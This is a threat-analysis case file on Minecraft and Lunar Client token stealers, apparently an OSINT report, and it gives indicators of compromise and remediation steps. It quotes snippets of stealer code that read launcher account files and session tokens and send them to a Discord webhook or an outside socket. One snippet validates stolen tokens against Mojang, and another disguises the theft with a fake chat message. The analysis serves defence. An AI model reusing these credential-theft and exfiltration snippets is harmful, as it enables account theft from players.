# Case 020 — Lunar Client / client-token stealers (OSINT, source-read)

- **Verdict:** **confirmed malicious** (published source read directly)
- **Category:** stealer payloads that read **other launcher clients'** account files
  (Lunar Client, `launcher_profiles.json`) and exfiltrate them
- **Handling:** OSINT only. **Source read, never executed.**
- **Date:** 2026-11-18
- **Analyst:** OpenHands (open-source intelligence)
- **Primary sources:**
  - `tsukilo/LunarClientTokenStealer` — https://github.com/tsukilo/LunarClientTokenStealer
  - `Diliard/R.A.T` — https://github.com/Diliard/R.A.T
  - `funnydude1668/minecraft-token-stealer` — https://github.com/funnydude1668/minecraft-token-stealer
- **Evidence:** `evidence/Program.cs`, `evidence/SkyblockExtras.java`, `evidence/server-app.js`,
  `evidence/Client.java`

---

## 1. Verdict

These are small, published **token-stealer payloads**. They matter because they show the theft does
not stop at the vanilla launcher: attackers also target **third-party clients** (Lunar, and any
launcher that keeps `accounts.json` / `launcher_profiles.json`). They are the building blocks that
get dropped by a "free client" lure.

## 2. Lunar Client token stealer (`tsukilo`, C#, 2021) — `evidence/Program.cs`

```csharp
String content = "Lunarclient Tokens : ";
FileInfo file = new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
                             + "\\.lunarclient\\settings\\game\\accounts.json");
...
hook.Send(message, file);   // uploads the whole accounts.json to a Discord webhook
```

- **Target:** `%USERPROFILE%\.lunarclient\settings\game\accounts.json` — Lunar Client's account
  store.
- **Exfil:** the entire file posted to a **Discord webhook**.
- Trivially repackaged into any mod/utility.

## 3. `Diliard/R.A.T` (Forge 1.8.9) — session-token stealer with a validating backend

`evidence/SkyblockExtras.java` reads the live session and posts it:

```java
String ip = new BufferedReader(new InputStreamReader(
        new URL("https://checkip.amazonaws.com/").openStream())).readLine();
String jsonInputString = String.format(
    "{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\" }",
    mc.getSession().getUsername(), mc.getSession().getPlayerID(),
    mc.getSession().getToken(), ip);
```

Note the disguise: the mod shows the victim a fake chat line —
*"This version of SBE has been disabled due to a security issue. Please update to the latest
version."* — to explain away any odd behaviour.

The companion backend (`evidence/server-app.js`) **validates each stolen token against Mojang**
before storing it in MongoDB:

```js
post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
    accessToken: req.body.token, selectedProfile: req.body.uuid, serverId: req.body.uuid
}), ...).then(r => { if (r.status == 204) { /* token is valid — store */ } })
```

This is a **token-checking service** — the attacker only keeps live tokens. It is the same "validate
then sell/use" pipeline that makes session theft profitable.

## 4. `funnydude1668/minecraft-token-stealer` — `evidence/Client.java`

Reads `%APPDATA%\.minecraft\launcher_profiles.json` and streams it to a socket:

```java
new FileInputStream(new File(System.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json"));
Socket sock = new Socket("example.com", 8080);
while (in.ready()) out.writeUTF(in.readLine());
```

The attacker fills in the host/port. Demonstrates the **file-scrape** variant of the attack
(no live `Session` object needed).

## 5. Indicators of compromise

```
file    %USERPROFILE%\.lunarclient\settings\game\accounts.json     (Lunar account store)
file    %APPDATA%\.minecraft\launcher_profiles.json                (launcher profiles)
string  https://checkip.amazonaws.com/                             (victim IP lookup)
string  sessionserver.mojang.com/session/minecraft/join            (token validation)
string  discord.com/api/webhooks/                                  (exfil)
string  "This version of SBE has been disabled..."                 (fake "update" chat message)
```

## 6. Why it matters

- The stolen token in these PoCs is **validated server-side**, so **only the live token matters** —
  rotate it (invalidate the session), not just the password.
- Attackers scrape **any** account file they can find (vanilla *and* third-party clients), so
  "I don't use the official launcher" is not protection.

## 7. Relationship to Cluster A

These are the **same primitives** we saw in Cluster A (case 014's PoC and the `Session` accessor).
They confirm the campaign is not exotic: the theft is a well-known, copy-paste-able ~30-line
technique, which is exactly why it recurs across "free client" campaigns.

## 8. Remediation

- Invalidate the Minecraft session and change the Microsoft password.
- If you use Lunar Client, re-login and check its account store; treat a stolen `accounts.json` as a
  live token.
- Don't run unknown mods/tools; use a token-hardening mod (case 014).

## 9. Caveats

- Published PoCs/kits (some educational); not independently re-verified by us.
- Source read only — no execution.
